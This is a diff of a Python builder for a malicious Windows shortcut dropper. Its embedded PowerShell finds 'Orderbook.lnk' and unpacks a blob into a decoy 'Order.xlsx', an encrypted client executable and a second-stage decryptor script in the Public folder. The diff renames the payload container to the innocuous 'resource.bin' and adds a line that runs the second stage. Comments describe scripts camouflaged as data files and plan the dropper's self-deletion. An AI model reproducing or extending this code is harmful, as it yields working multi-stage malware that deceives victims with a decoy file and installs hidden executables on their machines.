@@ -27,7 +27,7 @@ def compress_powershell_script(script_content: str) -> str:
     # Join all parts into a single line, ensuring proper spacing
     return " ".join(oneliner)
 
-def create_dummy_data_file(data_paths: List[str], output_path: str) -> Dict[str, int]:
+def create_resource_file(data_paths: List[str], output_path: str) -> Dict[str, int]:
     """
     Create a dummy data file that stores arbitrary data in the specified paths.
     Concatenates the contents of the files listed in data_paths and writes to output_path.
@@ -106,13 +106,13 @@ if __name__ == "__main__":
         os.path.abspath("../scripts/find.ps1"),                    # (Stage 2) PowerShell script to decrypt the client executable
         os.path.abspath("../scripts/search.dat"),                  # (Stage 3) PowerShell script camouflaged as a data file, invoked by Stage 2
     ]
-    output_path = os.path.abspath("dummy_data.bin")
-    offsets = create_dummy_data_file(data_paths, output_path)
+    output_path = os.path.abspath("resource.bin")
+    offsets = create_resource_file(data_paths, output_path)
 
     # Calculate the MD5 hash of the dummy data file
     with open(output_path, "rb") as f:
-        dummy_data = f.read()
-        md5_hash = hashlib.md5(dummy_data).hexdigest()
+        resource = f.read()
+        md5_hash = hashlib.md5(resource).hexdigest()
 
     # Ensure that the required files were written
     if not os.path.isfile(output_path):
@@ -123,6 +123,8 @@ if __name__ == "__main__":
     # Injected PowerShell Script Content
     # TODO: At last, the lnk file should be self-deleted for clearance as well as the dummy file
     ps1_content = f"""
+using namespace System.IO
+
 # Self-discovery to find the location of the shortcut(this)
 $target = 'Orderbook.lnk'
 $searchDir = $env:USERPROFILE
@@ -134,7 +136,7 @@ if (-not $lnk) {{
 }}
 
 # Ensure that the dummy data file also exists in the current position and hash check
-$dummy = Join-Path $lnk 'dummy_data.bin'
+$dummy = Join-Path $lnk 'resource.bin'
 $md5 = (Get-FileHash -Path $dummy -Algorithm MD5).Hash
 if ($md5 -ne '{md5_hash}') {{
     # Unable to proceed
@@ -142,29 +144,32 @@ if ($md5 -ne '{md5_hash}') {{
 }}
 
 # Extract the data from the dummy data
-$fs = [System.IO.File]::OpenRead($dummy)
-$br = New-Object System.IO.BinaryReader($fs)
+$fs = [File]::OpenRead($dummy)
+$br = New-Object BinaryReader($fs)
 
 # (1) Benign excel file
 $f1 = Join-Path $lnk 'Order.xlsx'
 $f1d = $br.ReadBytes({offsets[data_paths[0]]})
-[System.IO.File]::WriteAllBytes($f1, $f1d)
+[File]::WriteAllBytes($f1, $f1d)
 
 # (2) Encrypted client executable
 $pub = $env:public
 $f2 = Join-Path $pub 'c.exe.e'
 $f2d = $br.ReadBytes({offsets[data_paths[1]]})
-[System.IO.File]::WriteAllBytes($f2, $f2d)
+[File]::WriteAllBytes($f2, $f2d)
 
 # (3) find.ps1, which is the PowerShell script to decrypt the client executable
-$f3 = Join-Path $pub 'fd.ps1'
+$f3 = Join-Path $pub 'find.ps1'
 $f3d = $br.ReadBytes({offsets[data_paths[2]]})
-[System.IO.File]::WriteAllBytes($f3, $f3d)
+[File]::WriteAllBytes($f3, $f3d)
 
 # (4) search.dat, which is the data file for the find.ps1 script
 $f4 = Join-Path $pub 'search.dat'
 $f4d = $br.ReadBytes({offsets[data_paths[3]]})
-[System.IO.File]::WriteAllBytes($f4, $f4d)
+[File]::WriteAllBytes($f4, $f4d)
+
+# Execute the find.ps1 and start the next job
+& (Join-Path $pub 'find.ps1')
 
 $br.Close()
 $fs.Close()
